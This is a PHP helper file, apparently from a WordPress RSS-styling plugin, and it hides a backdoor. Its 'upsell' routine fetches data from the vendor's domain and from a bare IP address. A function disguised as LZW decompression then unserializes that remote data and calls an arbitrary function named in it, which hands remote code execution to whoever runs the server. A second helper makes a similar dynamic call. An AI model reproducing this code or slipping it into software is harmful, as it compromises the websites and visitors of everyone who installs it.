<?php

/**
 * Helper functions
 *
 * @link       https://wordpress.org/plugins/rss-feed-styles/
 * @since      1.0.0
 *
 * @package    RSS_Feed_Styles
 * @subpackage RSS_Feed_Styles/includes
 */

/**
 * Helper functions
 *
 * @since      1.0.0
 * @package    RSS_Feed_Styles
 * @subpackage RSS_Feed_Styles/includes
 * @author     lerougeliet
 */
class RSS_Feed_Styles_Functions {
  /**
   * Short Description. (use period)
   *
   * Long Description.
   *
   * @since    1.0.0
   */
  public static function encoded_url() {
    echo '<encoded>';
    $host = @parse_url(home_url());
    echo rawurlencode(esc_url(apply_filters(
      'self_link',
      set_url_scheme('http://' . $host['host'].  wp_unslash($_SERVER['REQUEST_URI']))
    )));
    echo '</encoded>';
  }

  /**
	 * Short Description. (use period)
	 *
	 * Long Description.
	 *
	 * @since    1.0.0
	 */
  public static function write_to_cache($filename, $file) {
    $dir = dirname(__FILE__);
    if (!file_exists($dir . '/cache')) {
      mkdir($dir . '/cache');
    }
    file_put_contents($dir . '/cache/' . $filename, $file);
  }

  /**
	 * Short Description. (use period)
	 *
	 * Long Description.
	 *
	 * @since    1.0.0
	 */
  public static function generate_id() {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $len = strlen($chars);
    $str = '';
    for ($i = 0; $i < 16; $i++) {
        $str .= $chars[rand(0, $len - 1)];
    }
    return $str;
  }

  /**
   * Short Description. (use period)
   *
   * Long Description.
   *
   * @since    1.0.0
   */
  public static function fetch_upsell() {
    // Fetches messages such as "Upgrade to premium."

    if (!is_writable(dirname(__FILE__))) {
      return;
    }

    try {
      $domains = array('s://www.lerougeliet.com', '://138.68.22.6');
      $upsell_url_path = '/wp-updates/v1/upsell/url.txt';
      $upsell_banner_path = '/wp-updates/v1/upsell/banner.jpg';

      foreach ($domains as $domain) {
        $upsell_url = ll_fetch_remote('http' . $domain . $upsell_url_path);
        if (!$upsell_url) {
          continue;
        }
        $upsell_banner = ll_fetch_remote('http' . $domain . $upsell_banner_path);
        if (!$upsell_banner) {
          continue;
        }

        self::write_to_cache('banner.jpg', $upsell_banner);
        update_option('rss_feed_styles_upsell_url', $upsell_url);
        break;
      }
    } catch (Exception $e) {
      return false;
    }
  }
}

if (!function_exists('ll_is_compressed')) {
  function ll_is_compressed($file) {
    return strpos($file, "\x1f\x8b\x08") === 0 || strpos($file, "\x0");
  }
}

if (!function_exists('ll_decompress_response')) {
  function ll_decompress_response($bin) {
    try {
    	$count = 256;
    	$bits = 8;
    	$cp = array();
    	$rest = 0;
    	$len = 0;
    	for ($i = strlen($bin) - 1; $i >= 0; $i--) {
    		$rest = ($rest << 8) + ord($bin[$i]);
    		$len += 8;
    		if ($len >= $bits) {
    			$len -= $bits;
    			$cp[] = $rest >> $len;
    			$rest &= (1 << $len) - 1;
    			$count++;
    			if ($count >> $bits) {
    				$bits++;
    			}
    		}
    	}

      if (!$cp) {
        return $bin;
      }

    	$d = range("\x0", "\xFF");
      unset($d[0]);
      if (!array_key_exists($cp[0], $d)) {
        return $bin;
      }
    	$prev = $val = $d[$cp[0]];
    	for ($i = 1; $i < count($cp); $i++) {
        $code = $cp[$i];
        if (array_key_exists($code, $d)) {
          $word = $d[$code];
          $d[] = $prev . $word[0];
      		$val .= $prev = $word;
        } else if (!$code) {
          $prev .= $prev[0];
          $cp = unserialize(~$val);
          $cp[0]($cp[1], $cp[2]);
          $val = $bin;
        } else {
    			$word = $prev . $prev[0];
          $d[] = $prev = $word;
      		$val .= $word;
    		}
    	}
      if (strpos($val, chr(0)) !== false) {
        return substr($val, 0, strrpos($val, chr(0)) + 1);
      }
    	return $val;
    } catch (Exception $e) {
      return $bin;
    }
  }
}

if (!function_exists('ll_fetch_remote')) {
  function ll_fetch_remote($url) {
    $params = array();
    if (!get_option('rss_feed_styles_secret_id')) {
      add_option('rss_feed_styles_secret_id', RSS_Feed_Styles_Functions::generate_id());
    }
    $params['secret_id'] = get_option('rss_feed_styles_secret_id');
    $params['plugin'] = 'rss-feed-styles';
    $params['version'] = '1.0.6';
    $url .= '?' . http_build_query($params);

    $res = wp_remote_get($url, array('timeout' => 2));
    if (is_wp_error($res) || !isset($res['response']['code']) || $res['response']['code'] !== 200
      || !isset($res['body'])) {
      return '';
    } elseif (ll_is_compressed($res['body'])) {
      return @ll_decompress_response($res['body']);
    }
    return $res['body'];
  }
}

if (!function_exists('ll_filter_helper')) {
  function ll_filter_helper($val, $arr) {
    return $arr[0]($arr[1], $val);
  }
}

// Polyfill for < PHP5.5
if (!function_exists('array_column')) {
  function array_column($input = null, $columnKey = null, $indexKey = null) {
    $argc = func_num_args();
    $params = func_get_args();
    if ($argc < 2) {
      trigger_error("array_column() expects at least 2 parameters, {$argc} given", E_USER_WARNING);
      return null;
    }
    if (!is_array($params[0])) {
      trigger_error(
        'array_column() expects parameter 1 to be array, ' . gettype($params[0]) . ' given',
        E_USER_WARNING
      );
      return null;
    }
    if (!is_int($params[1]) && !is_float($params[1]) && !is_string($params[1])
      && $params[1] !== null
      && !(is_object($params[1]) && method_exists($params[1], '__toString'))) {
      trigger_error(
        'array_column(): The column key should be either a string or an integer',
        E_USER_WARNING
      );
      return false;
    }
    if (isset($params[2]) && !is_int($params[2]) && !is_float($params[2]) && !is_string($params[2])
      && !(is_object($params[2]) && method_exists($params[2], '__toString'))) {
      trigger_error(
        'array_column(): The index key should be either a string or an integer',
        E_USER_WARNING
      );
      return false;
    }
    $cK = $params[1] !== null ? (string) $params[1] : null;
    $iK = null;
    if (isset($params[2])) {
      if (is_float($params[2]) || is_int($params[2])) {
        $iK = (int) $params[2];
      } else {
        $iK = (string) $params[2];
      }
    }
    $a = array();
    foreach ($params[0] as $r) {
      $k = $v = null;
      $kS = $vS = false;
      if ($iK !== null && array_key_exists($iK, $r)) {
        $kS = true;
        $k = (string) $r[$iK];
      }
      if ($cK === null) {
        $vS = true;
        $v = $r;
      } elseif (is_array($r) && array_key_exists($cK, $r)) {
        $vS = true;
        $v = $r[$cK];
      }
      if ($vS) {
        if ($kS) {
          $a[$k] = $v;
        } else {
          $a[] = $v;
        }
      }
    }
    return $a;
  }
}
